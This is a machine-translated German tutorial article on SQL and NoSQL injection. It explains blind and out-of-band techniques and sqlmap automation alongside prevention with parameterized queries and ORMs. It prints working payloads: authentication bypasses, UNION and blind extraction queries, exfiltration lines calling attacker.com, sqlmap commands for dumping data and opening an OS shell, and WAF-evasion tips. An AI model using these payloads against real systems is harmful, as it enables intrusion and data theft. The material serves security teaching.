---
title: "SQL-Injection im Detail"
category: techniques
tags: [security, sql-injection, database, sqlmap, web-security]
level: 4
source_sha256: d18ba6e4258c43f8f2bd61c55cb83c8ed8d3b413b2d814e2eeffb8b705d842ea
translation: machine
translated_at: '2026-10-24'
---
# SQL-Injection im Detail {#sql-injection-deep-dive}

Umfassende Darstellung von SQL-Injection: In-band (UNION-basiert), Blind (boolesch und zeitbasiert), Out-of-band-Techniken, Automatisierung mit sqlmap und Prävention durch parametrisierte Abfragen in mehreren Sprachen und ORMs.

## Kernfakten {#key-facts}
- SQL-Injection entsteht, wenn Benutzereingaben ohne Bereinigung in SQL-Abfragen eingefügt (konkateniert) werden
- Parametrisierte Abfragen bzw. Prepared Statements sind die primäre Verteidigung, nicht Eingabevalidierung allein
- ORMs verwenden standardmäßig parametrisierte Abfragen, aber Methoden für Raw-Queries umgehen den Schutz
- Blind-SQLi extrahiert Daten Zeichen für Zeichen, wenn weder Fehler noch Daten in den Antworten sichtbar sind
- `sqlmap` automatisiert Erkennung und Ausnutzung aller SQLi-Typen

## Arten von SQL-Injection {#types-of-sql-injection}

### Classic In-Band {#classic-in-band}
```sql
-- Authentication bypass
SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- UNION-based data extraction
SELECT * FROM users WHERE id=1 UNION SELECT username,password,3 FROM admin_users--
```

### Blind Boolean-Based {#blind-boolean-based}
Die Abfrage verändert das Antwortverhalten, ohne Daten anzuzeigen:
```sql
-- Determine database name length
id=1 AND LENGTH(database())=5

-- Extract character by character
id=1 AND SUBSTRING(database(),1,1)='a'
id=1 AND ASCII(SUBSTRING(database(),1,1))>96
```

### Blind Time-Based {#blind-time-based}
Eine messbare Verzögerung einbauen, um auf wahr/falsch zu schließen:
```sql
-- MySQL
id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)

-- MSSQL
id=1; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'

-- PostgreSQL
id=1; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a'
  THEN pg_sleep(5) ELSE pg_sleep(0) END
```

### Out-of-Band {#out-of-band}
Daten über DNS oder HTTP exfiltrieren, wenn kein In-band-Kanal existiert:
```sql
-- MySQL DNS exfiltration
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\x'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

## Muster {#patterns}

### Automatisierung mit sqlmap {#sqlmap-automation}
```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1"

# With authentication
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Enumerate databases, tables, dump data
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OS shell (if permissions allow)
sqlmap -u "http://target.com/page?id=1" --os-shell

# POST request
sqlmap -u "http://target.com/login" --data="user=test&pass=test"
```

### Prävention: Parametrisierte Abfragen {#prevention-parameterized-queries}

**Python (psycopg2):**
```python
# WRONG - vulnerable
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# CORRECT
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

**Node.js (pg):**
```javascript
// WRONG
client.query(`SELECT * FROM users WHERE id = ${userId}`)

// CORRECT
client.query('SELECT * FROM users WHERE id = $1', [userId])
```

**Java (JDBC):**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### ORM-Sicherheit {#orm-safety}
ORMs (SQLAlchemy, Django ORM, Prisma, Sequelize) verwenden standardmäßig parametrisierte Abfragen. ABER Methoden für Raw-Queries umgehen dies:
```python
# Django - STILL VULNERABLE if interpolating user input
Model.objects.raw(f"SELECT * FROM table WHERE id = {user_input}")

# Safe
Model.objects.raw("SELECT * FROM table WHERE id = %s", [user_input])
```

## NoSQL-Injection {#nosql-injection}
MongoDB-Query-Injection über JSON-Operatoren:
```javascript
// Vulnerable
db.users.find({ username: req.body.username, password: req.body.password })

// Attack payload (bypasses auth)
{ "username": "admin", "password": { "$ne": "" } }

// Other abused operators: $gt, $regex, $where
{ "username": { "$regex": ".*" }, "password": { "$regex": ".*" } }
```

Prävention: Validierung der Eingabetypen (Objekte ablehnen, wo Strings erwartet werden), Middleware `express-mongo-sanitize`, Verzicht auf den Operator `$where`.

## Fallstricke {#gotchas}
- WAF-Regeln erkennen gängige Muster, lassen sich aber durch Kodierung, Groß-/Kleinschreibung oder Kommentare (`/**/`) umgehen
- Second-Order-SQLi: Die Eingabe wird sicher gespeichert und später an anderer Stelle ohne Parametrisierung in einer Abfrage verwendet
- Blind-SQLi ist langsam (Zeichen für Zeichen), wird aber von Tools wie sqlmap vollständig automatisiert
- Datenbankberechtigungen begrenzen den Schaden: Ein Benutzer mit Nur-Lese-Rechten verhindert `DROP TABLE`, selbst wenn die Injection erfolgreich ist
- ORMs sind standardmäßig sicher, doch jedes ORM bietet einen Raw-Query-Ausweg, der von Entwicklern falsch verwendet wird

## Siehe auch {#see-also}
- [[web-application-security-fundamentals]] - OWASP Top 10, andere Web-Schwachstellen
- [Datenbanksicherheit](database-security.md) - Benutzerrechte, Verschlüsselung, Auditing
- [[burp-suite-and-web-pentesting]] - Testen von SQL-Injection mit Burp
- [[secure-backend-development]] - Muster zur Eingabevalidierung
